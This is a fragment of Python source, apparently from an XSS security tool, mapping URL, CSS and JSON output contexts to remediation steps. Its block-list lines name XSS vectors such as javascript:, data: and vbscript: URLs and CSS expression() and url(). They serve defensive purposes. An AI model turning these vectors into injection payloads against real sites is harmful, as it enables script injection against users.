            XSSContext.URL: (
                "1. Validate URLs against an allowlist of protocols (http, https)\n"
                "2. URL-encode user input in URL parameters\n"
                "3. Block javascript:, data:, and vbscript: protocols\n"
                "4. Use rel='noopener noreferrer' on external links"
            ),
            XSSContext.CSS: (
                "1. Never allow user input in style tags or attributes\n"
                "2. Use predefined CSS classes instead of inline styles\n"
                "3. Sanitize CSS with a strict allowlist\n"
                "4. Block expression(), url(), and import directives"
            ),
            XSSContext.JSON: (
                "1. Properly escape JSON strings with JSON.stringify()\n"
                "2. Set Content-Type: application/json header\n"
                "3. Avoid rendering JSON in HTML context\n"
                "4. Validate JSON structure on the server"
            )
        }

        return remediations.get(context, remediations[XSSContext.HTML_BODY])